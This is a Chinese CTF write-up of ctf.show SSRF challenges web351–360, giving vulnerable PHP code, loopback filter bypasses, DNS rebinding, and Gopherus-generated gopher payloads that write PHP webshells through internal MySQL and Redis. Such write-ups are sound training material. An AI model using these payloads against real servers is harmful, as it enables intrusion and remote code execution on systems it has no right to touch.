---
title: "SSRF"
date: 2024-10-29
---
# SSRF

## web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

POST传参：

1. 直接访问`url=127.0.0.1/flag.php`
2. php伪协议读取文件`url=file:///var/www/html/flag.php`

## web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

意思是过滤了`localhost`和`127.0.0`(实际上并没有)

```
http://127.0.1.1/
所有127开头的都是回环地址
http://0/
http://0.0.0.0/
http://localhost/
http://0x7F000001/ //16进制
http://2130706433/ //10进制
http://0177.0000.0000.0001/ //8进制
http://sudo.cc/
```

post传参`url=http://127.0.0.1/flag.php`,得到flag

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

过滤`localhost`、`127.0.`、`。`

```
所有127开头的都是回环地址
http://0/
http://0.0.0.0/
http://0x7F000001/ //16进制
http://2130706433/ //10进制
http://0177.0000.0000.0001/ //8进制
```

post传参`url=http://0.0.0.0/flag.php`,得到flag

## web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

一些解析到 127.0.0.1的公共 http 域名

```
http://safe.taobao.com/

http://114.taobao.com/

http://wifi.aliyun.com/

http://imis.qq.com/

http://localhost.sec.qq.com/

http://ecd.tencent.com/

http://spoofed.burpcollaborator.net/
```

## web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

host长度<=5

```
url=http://127.1/flag.php
url=http://0/flag.php
```

## web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

host长度<=3

```
url=http://0/flag.php
```

## web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
```

函数解析：

```php
gethostbyname()
返回主机名 hostname 对应的 IPv4 互联网地址。

FILTER_FLAG_IPV4
要求值是合法的 IPv4 IP（比如 255.255.255.255）

FILTER_FLAG_IPV6
要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）

FILTER_FLAG_NO_PRIV_RANGE
要求值是 RFC 指定的私域 IP （比如 192.168.0.1）

FILTER_FLAG_NO_RES_RANGE
要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

```

[DNS重绑定]([rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg))

填一个公网ip

A 127.0.0.1 

B 1.1.1.23

## web358

```PHP
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

```
url=http://ctf.@127.0.0.1/flag.php?show
url=http://ctf.:passwd@127.0.0.1/flag.php#show
url=http://ctf.@127.0.0.1/flag.php#show
```

```
url=http://ctf.@127.0.0.1/flag.php?show
```

此处`ctf.`将作为账号登录127.0.0.1，并且向flag.php传一个`show参数`来绕过

## web359

登录处抓包
[![image](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124181722545-1892131882.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124181722545-1892131882.png)
发现存在reurl参数
并且跳转到check.php文件
此题用到了一个工具`Gopherus`，用gopher协议打mysql的一个工具
https://github.com/tarunkant/Gopherus

```bash
python gopherus.py --exploit mysql
root
select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/aa.php';
```

将生成的字符`_`后面的再进行一次URL编码

通过POST方式传入

```http
POST /check.php HTTP/1.1
Host: 43fe9661-9298-4590-be46-96e4a4a948ad.challenge.ctf.show
Content-Length: 1303
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Origin: https://43fe9661-9298-4590-be46-96e4a4a948ad.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://43fe9661-9298-4590-be46-96e4a4a948ad.challenge.ctf.show/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

u=Username&returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%2561%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
```

## web360

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

先利用dict探测一下端口，看看6379存不存在，

如果目标的redis换端口了，就利用dict协议来探测

```
url=dict://127.0.0.1:6379/

显示：
-ERR Unknown subcommand or wrong number of arguments for 'libcurl'. Try CLIENT HELP +OK
6379存在
```

redis攻击

`Gopherus`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/Gopherus-master]
└─# python2 gopherus.py --exploit redis

                                                                                                                   
  ________              .__                                                                                        
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                         
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                         
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                          
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                         
        \/       |__|        \/     \/                 \/                                                          
                                                                                                                   
                author: $_SpyD3r_$                                                                                 
                                                                                                                   

Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): PHPshell       

Give web root location of server (default is /var/www/html):                                                       
Give PHP Payload (We have default PHP Shell): <?php eval($_POST['cmd']);?>

Your gopher link is Ready to get PHP Shell:                                                                        
                                                                                                                   
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. 

-----------Made-by-SpyD3r-----------

```

将生成的字符`_`后面的再进行一次URL编码

post传参

```
url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

默认访问/shell.php

利用一句话木马读取flag
